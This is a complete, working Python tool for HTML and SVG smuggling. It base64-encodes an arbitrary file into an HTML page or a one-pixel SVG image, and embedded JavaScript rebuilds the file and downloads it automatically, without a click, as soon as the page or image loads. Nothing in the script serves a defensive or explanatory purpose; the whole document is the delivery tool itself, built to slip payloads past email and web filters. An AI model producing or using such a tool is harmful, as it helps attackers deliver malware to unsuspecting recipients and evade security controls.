import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('--file', '-f', help='File to be smuggled', type=str, required=True)
parser.add_argument('--name', '-n', help='Name of output file after smuggling', type=str, required=True)
parser.add_argument('--type', '-t',help='Options: \'HTML\' or \'SVG\'', choices=['html','svg'], required=True)
parser.add_argument('--output', '-o', help='Outpu name, do not include an extension', type=str, required=False)

args = parser.parse_args()

# Get supplied arguments
smuggle_file = args.file
smuggle_filename = args.name
smuggle_type = args.type

# HTML template
htmlbody = """<html>
	<body>
		<script>
			function base64ToArrayBuffer(base64) {{
			  var binary_string = window.atob(base64);
			  var len = binary_string.length;
			  var bytes = new Uint8Array( len );
			  for (var i = 0; i < len; i++) {{ bytes[i] = binary_string.charCodeAt(i); }}
			  return bytes.buffer;
			}}

			var file ='{b64code}';
			var data = base64ToArrayBuffer(file);
			var blob = new Blob([data], {{type: 'octet/stream'}});
			var fileName = '{filename}';

			if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
			else {{
			  var a = document.createElement('a');
			  document.body.appendChild(a);
			  a.style = 'display: none';
			  var url = window.URL.createObjectURL(blob);
			  a.href = url;
			  a.download = fileName;
			  a.click();
			  window.URL.revokeObjectURL(url);
			}}
		</script>
	</body>
</html>"""

# SVG template
svgbody = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="1" height="1">
    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {{
            function base64ToArrayBuffer(base64) {{
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) {{ bytes[i] = binary_string.charCodeAt(i); }}
                return bytes.buffer;
            }}
            var file = '{b64code}';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {{type: 'octet/stream'}});
            var fileName = '{filename}';
            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
            document.documentElement.appendChild(a);
            a.setAttribute('style', 'display: none');
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }});
    ]]></script>
</svg>"""

def Smuggler(b64code):

	# Set the output filename
	if args.output is not None:
		output_filename = args.output
	else:
		output_filename = "smuggler-{type}".format(type=smuggle_type)

	# Creates the output HTML or SVG file
	with open("{output_filename}.{extension}".format(output_filename=output_filename,extension=smuggle_type),"w") as file:
		if(smuggle_type == "html"):
			file.write(htmlbody.format(b64code=b64code.decode('ascii'),filename=smuggle_filename))
		elif(smuggle_type == "svg"):
			file.write(svgbody.format(b64code=b64code.decode('ascii'),filename=smuggle_filename))

# Read the input file and convert it to base64
with open(smuggle_file, "rb") as binary_file:
    b64_file = base64.b64encode(binary_file.read())

# Run the method to create the output file
Smuggler(b64_file)
